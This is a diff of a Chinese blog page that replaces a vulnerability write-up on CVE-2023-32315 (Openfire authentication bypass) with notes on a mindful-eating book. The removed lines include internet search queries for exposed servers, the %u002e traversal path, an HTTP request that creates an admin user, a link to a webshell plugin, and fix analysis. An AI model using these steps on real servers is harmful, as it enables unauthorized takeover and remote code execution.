@@ -19,32 +19,24 @@
   <meta name="author" content="守心">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称：Openfire 管理后台认证绕过漏洞复现 应用介绍：Openfire 是免费的、开源的、基于可拓展通讯和表示协议 ( XMPP )、采用Java编程语言开发的实时协作服务器。Openfire安装和使用都非常简单，并利用Web进行管理。单台服务器甚至可支持上万并发用户。 影响版本：  3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8  4.7.0 &amp;lt">
+    <meta name="description" content="前言正念饮食这本书其实很早都买回来了，应该是和 《 正念的奇迹 》一起的，但是一直都没看，最后还卖掉了。《 正念的奇迹 》还留着，因为真的是一本很好的书。 那么，为什么都卖掉了，还有这篇博客呢？ 因为看到樊登讲书中有这本书，今天上下班的通勤的时候就给听完了，所以简单整理一下主要是个人感悟，读书笔记不太喜欢写，直接贴一下樊登的思维导图就行。 至于为什么不看，因为感觉太繁杂了，整个一本书讲的其实重点不">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2023-32315 openfire 认证绕过漏洞">
-<meta property="og:url" content="https://liancccc.github.io/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-32315/index.html">
+<meta property="og:title" content="《 正念饮食 》（ 学会吃饭 ）">
+<meta property="og:url" content="https://liancccc.github.io/2025/06/10/%E7%94%9F%E6%B4%BB/%E7%B2%BE%E7%A5%9E%E9%A3%9F%E7%B2%AE/%E6%AD%A3%E5%BF%B5%E9%A5%AE%E9%A3%9F/index.html">
 <meta property="og:site_name" content="liancccc&#39;s blog">
-<meta property="og:description" content="漏洞信息漏洞名称：Openfire 管理后台认证绕过漏洞复现 应用介绍：Openfire 是免费的、开源的、基于可拓展通讯和表示协议 ( XMPP )、采用Java编程语言开发的实时协作服务器。Openfire安装和使用都非常简单，并利用Web进行管理。单台服务器甚至可支持上万并发用户。 影响版本：  3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8  4.7.0 &amp;lt">
+<meta property="og:description" content="前言正念饮食这本书其实很早都买回来了，应该是和 《 正念的奇迹 》一起的，但是一直都没看，最后还卖掉了。《 正念的奇迹 》还留着，因为真的是一本很好的书。 那么，为什么都卖掉了，还有这篇博客呢？ 因为看到樊登讲书中有这本书，今天上下班的通勤的时候就给听完了，所以简单整理一下主要是个人感悟，读书笔记不太喜欢写，直接贴一下樊登的思维导图就行。 至于为什么不看，因为感觉太繁杂了，整个一本书讲的其实重点不">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/72349e28-1e9b-47db-ae62-800d4bbac1b9.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/42617c38-4ed7-47bb-a0ed-20e3eb618c4f.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/08b412a7-ff84-4314-aab1-98401aa074e1.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/d9c9b1dd-9b38-4be8-9fcc-58b4b6334668.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/af421475-d13a-474a-843e-497c290cbcae.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/a03bceed-007b-4ace-aafa-cd94c4764689.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/da093bba-4428-4b68-9a08-86055c9f7dde.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/423f92af-ec04-4440-b890-66aa3139b62f.png?imageSlim">
-<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/25880dd2-c93d-4128-bd18-0fffafe2091f.png?imageSlim">
-<meta property="article:published_time" content="2023-11-15T04:47:44.000Z">
-<meta property="article:modified_time" content="2025-06-08T08:32:17.702Z">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/%E6%AD%A3%E5%BF%B5%E9%A5%AE%E9%A3%9F%EF%BC%88%E5%8E%9F%E3%80%8A%E5%AD%A6%E4%BC%9A%E5%90%83%E9%A5%AD%E3%80%8B%EF%BC%89_1749558199255.jpg">
+<meta property="article:published_time" content="2025-06-10T14:25:09.000Z">
+<meta property="article:modified_time" content="2025-06-10T12:35:13.004Z">
 <meta property="article:author" content="守心">
-<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="精神食粮">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/72349e28-1e9b-47db-ae62-800d4bbac1b9.png?imageSlim">
+<meta name="twitter:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/%E6%AD%A3%E5%BF%B5%E9%A5%AE%E9%A3%9F%EF%BC%88%E5%8E%9F%E3%80%8A%E5%AD%A6%E4%BC%9A%E5%90%83%E9%A5%AD%E3%80%8B%EF%BC%89_1749558199255.jpg">
   
   
   
-  <title>CVE-2023-32315 openfire 认证绕过漏洞 - liancccc&#39;s blog</title>
+  <title>《 正念饮食 》（ 学会吃饭 ） - liancccc&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -210,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CVE-2023-32315 openfire 认证绕过漏洞"></span>
+            <span id="subtitle" data-typed-text="《 正念饮食 》（ 学会吃饭 ）"></span>
           
         </div>
 
@@ -221,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-11-15 12:47" pubdate>
-          2023年11月15日 下午
+        <time datetime="2025-06-10 22:25" pubdate>
+          2025年6月10日 晚上
         </time>
       </span>
     
@@ -233,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          991 字
+          445 字
         
       </span>
     
@@ -244,7 +236,7 @@
         
         
         
-          9 分钟
+          4 分钟
         
       </span>
     
@@ -281,82 +273,23 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CVE-2023-32315 openfire 认证绕过漏洞</h1>
+            <h1 id="seo-header">《 正念饮食 》（ 学会吃饭 ）</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞名称：Openfire 管理后台认证绕过漏洞复现</p>
-<p>应用介绍：Openfire 是免费的、开源的、基于可拓展通讯和表示协议 ( XMPP )、采用Java编程语言开发的实时协作服务器。Openfire安装和使用都非常简单，并利用Web进行管理。单台服务器甚至可支持上万并发用户。</p>
-<p>影响版本：</p>
-<ul>
-<li><p>3.10.0 &lt;&#x3D; Openfire &lt; 4.6.8</p>
-</li>
-<li><p>4.7.0 &lt;&#x3D; Openfire 4.7.x &lt; 4.7.5</p>
-</li>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正念饮食这本书其实很早都买回来了，应该是和 《 正念的奇迹 》一起的，但是一直都没看，最后还卖掉了。《 正念的奇迹 》还留着，因为真的是一本很好的书。</p>
+<p>那么，为什么都卖掉了，还有这篇博客呢？</p>
+<p>因为看到樊登讲书中有这本书，今天上下班的通勤的时候就给听完了，所以简单整理一下主要是个人感悟，读书笔记不太喜欢写，直接贴一下樊登的思维导图就行。</p>
+<p>至于为什么不看，因为感觉太繁杂了，整个一本书讲的其实重点不是特别多，集中在正念，在和食物建立良好关系，所以看了一半就不怎么想继续看下去了。</p>
+<h2 id="导图"><a href="#导图" class="headerlink" title="导图"></a>导图</h2><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/%E6%AD%A3%E5%BF%B5%E9%A5%AE%E9%A3%9F%EF%BC%88%E5%8E%9F%E3%80%8A%E5%AD%A6%E4%BC%9A%E5%90%83%E9%A5%AD%E3%80%8B%EF%BC%89_1749558199255.jpg" srcset="/img/loading.gif" lazyload alt="正念饮食（原《学会吃饭》）_1749558199255"></p>
+<h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><ul>
+<li>培养内在的 “美食家”，美食家会去认真品尝、认真对待食物</li>
+<li>挑剔的 “美食家” ，味蕾的满足要比饱腹感更值得追求</li>
+<li>食物带给我们赖以生存的能量，我们应该对进食感到感恩，而不是为了进食而进食，也不是为了发泄心理的压力而进食。可以因为喜欢这个食物，可以因为开心，抑或是因为控制饮食有点紧也可以去吃，但不要去盲目的或者发泄性的进食</li>
+<li>摒弃要把食物吃完这个概念，并不是全部吃完就睡对食物的尊重，这些多于的食物并不能为你的身体带来好的一面，反而是另一种意义上的浪费食物。吃不完，可以打包，可以放冰箱，下一顿再吃就好了。</li>
+<li>和食物合集，和自己和解</li>
 </ul>
-<p>漏洞介绍：Openfire的Web管理后台存在一处目录穿越漏洞，这将允许攻击者绕过权限校验访问所有受限页面。我们可以借此漏洞未授权创建管理员用户，并结合后台自定义插件的上传，达到 RCE。</p>
-<p>搜索语法：</p>
-<ul>
-<li>icon_hash&#x3D;”1211608009”</li>
-<li>body&#x3D;”jive-loginVersion” </li>
-<li>title&#x3D;”Openfire Admin Console”</li>
-<li>title&#x3D;”Openfire 管理”</li>
-<li>title&#x3D;”Openfire Console Admin”</li>
-</ul>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a target="_blank" rel="noopener" href="https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4_x64.exe"><strong>https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4_x64.exe</strong></a></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Openfire 管理后台曾经爆出过一次 CVE-2008-6508，该漏洞也是路径穿越漏洞，随后官方对其进行修复，修复方法为检测路径中是否有 <code>..</code> 和 <code>%2e</code> ( .. 的 url 编码 )，但由于Openfire内置的 Jetty Web 服务器升级支持对 UTF-16 ( %u002e ) 这类非标准 unicode uri 的解析，从而使路径穿越重新出现。</p>
-<p>源码：<a target="_blank" rel="noopener" href="https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4.zip">https://github.com/igniterealtime/Openfire/releases/download/v4.7.4/openfire_4_7_4.zip</a></p>
-<p>先看 web.xml 中的过滤器：xmppserver&#x2F;src&#x2F;main&#x2F;webapp&#x2F;WEB-INF&#x2F;web.xml</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>AuthCheck<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.jivesoftware.admin.AuthCheckFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>excludes<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span><br>            login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>定位过滤器位置，查看器 doFilter 函数：<code>org/jivesoftware/admin/AuthCheckFilter.java</code></p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/72349e28-1e9b-47db-ae62-800d4bbac1b9.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>它有一个对于 excludes的判断，就是判断 URL 是否是后台过滤器的白名单，如果是那就不进行后面匹配，跟进具体的实现：</p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/42617c38-4ed7-47bb-a0ed-20e3eb618c4f.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>可以看到它第一个判断中，对应有 *存在的白名单规则，截取路径部分，然后判断其中是否包含 .. 和 %2e，如果都不存在则返回 true 然后就会绕过后面的权限校验。</p>
-<p>上面说过器内置服务器可以解析 UTF-16 这类字符，那么就可以把 ..&#x2F;换成 %u002e%u002e&#x2F; 就可以再次进行路径穿越。</p>
-<p>那么只要使用 setup&#x2F;setup-* 加上  %u002e%u002e&#x2F;  就可以实现路径穿越。</p>
-<p>就像这样：&#x2F;setup&#x2F;setup-s&#x2F;%u002e%u002e&#x2F;%u002e%u002e&#x2F;log.jsp</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用思路为：</p>
-<ol>
-<li><p>创建后台用户登录后台</p>
-</li>
-<li><p>上传插件 getshell</p>
-</li>
-</ol>
-<p>创建后台用户：</p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/08b412a7-ff84-4314-aab1-98401aa074e1.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<pre><code class="hljs">GET /user-create.jsp?csrf=643LDwk5NJtV8JO&amp;username=demo&amp;name=&amp;email=&amp;password=demo&amp;passwordConfirm=&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1
-Host: 127.0.0.1:9090
-sec-ch-ua: 
-sec-ch-ua-mobile: ?0
-sec-ch-ua-platform: &quot;&quot;
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: http://127.0.0.1:9090/user-create.jsp
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: JSESSIONID=node0p140w41smlfh1vcb7ab9h9gm938.node0; csrf=643LDwk5NJtV8JO
-Connection: close
-</code></pre>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/d9c9b1dd-9b38-4be8-9fcc-58b4b6334668.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>发现还需要一个 csrf 和 JSESSIONID，这两个东西直接访问个页面就会回显：</p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/af421475-d13a-474a-843e-497c290cbcae.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>获取这 2 个东西后，即可创建用户。不过后面发现没有这两个也能创建用户，但是貌似不太稳定？第一次直接成功，但后面几次都失败了，还是加上稳一点。</p>
-<p>然后上传插件：<a target="_blank" rel="noopener" href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar">https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/download/v0.1/org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar</a></p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/a03bceed-007b-4ace-aafa-cd94c4764689.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>密码是 123</p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/da093bba-4428-4b68-9a08-86055c9f7dde.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>看了一下过滤器，发现直接把有 *的白名单给删除了：</p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/423f92af-ec04-4440-b890-66aa3139b62f.png?imageSlim" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p>然后 testURLPassesExclude 这里，对 URL 进行 utf-8 解码，这样就解决了上面的因为编码问题导致绕过：</p>
-<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/25880dd2-c93d-4128-bd18-0fffafe2091f.png?imageSlim" srcset="/img/loading.gif" lazyload alt="25880dd2-c93d-4128-bd18-0fffafe2091f"></p>
 
                 
               </div>
@@ -375,7 +308,7 @@ Connection: close
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a>
+  <a href="/categories/%E7%94%9F%E6%B4%BB/" class="category-chain-item">生活</a>
   
   
 
@@ -390,7 +323,7 @@ Connection: close
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
+        <a href="/tags/%E7%B2%BE%E7%A5%9E%E9%A3%9F%E7%B2%AE/" class="print-no-link">#精神食粮</a>
       
     </div>
   
@@ -402,8 +335,8 @@ Connection: close
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CVE-2023-32315 openfire 认证绕过漏洞</div>
-      <div>https://liancccc.github.io/2023/11/15/漏洞分析/CVE-2023-32315/</div>
+      <div>《 正念饮食 》（ 学会吃饭 ）</div>
+      <div>https://liancccc.github.io/2025/06/10/生活/精神食粮/正念饮食/</div>
     </div>
     <div class="license-meta">
       
@@ -415,7 +348,7 @@ Connection: close
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年11月15日</div>
+          <div>2025年6月10日</div>
         </div>
       
       
@@ -447,18 +380,12 @@ Connection: close
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2022-34267/" title="CVE-2022-34267 SDL WorldServer 身份认证绕过 RCE">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CVE-2022-34267 SDL WorldServer 身份认证绕过 RCE</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/11/15/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2023-36845/" title="CVE-2023-36845 Juniper SRX EX 远程命令执行漏洞">
-                        <span class="hidden-mobile">CVE-2023-36845 Juniper SRX EX 远程命令执行漏洞</span>
+                      <a href="/2025/06/08/%E8%9B%87%E7%B1%BB/%E5%9B%BD%E5%86%85%E6%AF%92%E8%9B%87-01/" title="国内毒蛇（ 一 ）">
+                        <span class="hidden-mobile">国内毒蛇（ 一 ）</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
